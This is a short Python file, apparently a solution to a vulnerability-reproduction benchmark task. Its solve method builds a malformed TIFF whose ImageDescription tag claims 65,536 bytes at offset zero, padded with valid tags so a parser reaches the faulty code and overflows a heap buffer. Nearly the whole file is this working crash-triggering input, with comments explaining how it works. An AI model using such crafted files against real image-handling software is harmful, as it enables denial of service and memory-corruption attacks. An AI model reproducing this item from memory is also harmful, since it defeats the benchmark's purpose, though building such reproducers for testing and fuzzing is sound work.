import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a TIFF file that triggers the Heap Buffer Overflow vulnerability.
        # The vulnerability is caused by invalid offline tags with a value offset of zero.
        # "Offline" means the data doesn't fit in the 4-byte value field (count * type_size > 4).
        # We create a tag with a large count (size > file size) and offset 0.
        
        # TIFF Header: Little Endian "II", Magic 42, First IFD at offset 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Entries
        # We include standard tags to ensure the file is accepted as a valid TIFF structure
        # before processing the vulnerable tag.
        tags = [
            (0x100, 3, 1, 100),       # ImageWidth: Short, 1, 100
            (0x101, 3, 1, 100),       # ImageLength: Short, 1, 100
            (0x102, 3, 1, 8),         # BitsPerSample: Short, 1, 8
            (0x103, 3, 1, 1),         # Compression: Short, 1, 1 (None)
            (0x106, 3, 1, 1),         # PhotometricInterpretation: Short, 1, 1 (BlackIsZero)
            # Vulnerable Tag: ImageDescription (0x10E)
            # Type 2 (ASCII), Count 0x10000 (65536 bytes) -> Clearly offline
            # Offset 0 -> Points to start of file
            # This causes the parser to read 65536 bytes from offset 0, overflowing the file buffer.
            (0x10E, 2, 0x10000, 0),
            (0x111, 4, 1, 8),         # StripOffsets: Long, 1, 8 (Points to header, valid memory)
            (0x115, 3, 1, 1),         # SamplesPerPixel: Short, 1, 1
            (0x116, 3, 1, 100),       # RowsPerStrip: Short, 1, 100
            (0x117, 4, 1, 100)        # StripByteCounts: Long, 1, 100
        ]
        
        # Sort tags by Tag ID as required by TIFF specification
        tags.sort(key=lambda x: x[0])
        
        # Build IFD
        # Number of entries (2 bytes)
        ifd = struct.pack('<H', len(tags))
        
        # Entries (12 bytes each: Tag, Type, Count, Value/Offset)
        for t in tags:
            ifd += struct.pack('<HHII', *t)
            
        # Offset to next IFD (4 bytes) -> 0 (Last IFD)
        ifd += struct.pack('<I', 0)
        
        return header + ifd